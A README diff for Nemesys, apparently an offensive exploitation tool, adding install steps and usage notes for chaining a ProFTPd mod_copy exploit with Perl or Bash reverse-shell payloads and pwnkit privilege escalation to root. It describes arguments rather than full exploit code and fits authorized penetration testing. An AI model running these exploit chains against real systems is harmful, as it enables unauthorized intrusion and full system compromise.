@@ -157,6 +157,66 @@ The main exploitation process in Nemesys involves the following steps:
 
 This modular structure ensures that each component performs its role effectively, contributing to a cohesive and efficient exploitation workflow in Nemesys.
 
+## Installation ⚙️
+To use Nemesys, you'll need to have the necessary dependencies installed and be able to run the Python script from your terminal.
+
+Clone the repository to your machine:
+
+```bash
+git clone https://github.com/sergio11/nemesys.git
+```
+
+Navigate to the directory:
+
+```bash
+cd nemesys
+```
+Install dependencies:
+
+```bash
+pip install -r requirements.txt
+```
+
+## Usage Examples 🚀
+
+Once everything is set up, you can invoke the **Nemesys** tool using the `nemesys_cli.py` script. Below are several examples of how to use it, along with explanations.
+
+### 1. Basic Exploit Invocation 💥
+
+This command runs an exploit with a specific payload and sets up reverse connections for the exploit to work.
+
+#### Description 📜:
+- `--password "password"`: The password used for authentication on the target system. 🔑
+- `--exploit_name "unix/ftp/proftpd_modcopy_exec"`: The specific exploit you want to run, targeting a vulnerability in ProFTPd. 📡
+- `--payload_name "cmd/unix/reverse_perl"`: The payload that will execute after the exploit is successful (reverse shell using Perl). 🖥️
+- `--rhosts "192.168.11.128"`: The target machine's IP address for the exploit. 🎯
+- `--sitepath "/var/www/html"`: The path to the website directory (used in web-based exploits). 🌍
+- `--lhost "192.168.11.129"`: Your machine's IP address where the reverse shell will connect back. 🔙
+- `--lport 4445`: The local port on your machine that the reverse shell will connect to. ⚙️
+- `--privilege_exploit "linux/local/cve_2021_4034_pwnkit_lpe_pkexec"`: A local privilege escalation exploit to gain root access on the target. 🔓
+- `--target "192.168.11.128"`: The IP address of the target machine to attack. 🎯
+
+#### Expected Outcome 🏆:
+Once you execute the command, **Nemesys** will attempt to exploit the ProFTPd vulnerability, trigger a reverse shell on your local machine, and then escalate privileges using the `pwnkit` local privilege escalation vulnerability.
+
+---
+
+### 2. Using a Different Payload 🚨
+
+To use a different payload (e.g., `cmd/unix/reverse_bash`), simply modify the `--payload_name` parameter.
+
+#### Change Explained 🔄:
+- `--payload_name "cmd/unix/reverse_bash"`: Swapping the payload to a Bash reverse shell. 💥
+
+---
+
+### 3. Exploiting Without Privilege Escalation 🔓
+
+If you don't need to perform privilege escalation, simply omit the `--privilege_exploit` parameter.
+
+#### What Happens? 🔍
+This command will perform the exploit and create a reverse shell without attempting to escalate privileges. It's useful when you only need a foothold without full system control. 💥
+
 ## ⚠️ Disclaimer
 **Nemesys is intended for authorized and ethical use only**. Unauthorized use may result in severe legal consequences. Always have proper authorization before using this tool on any system.
 
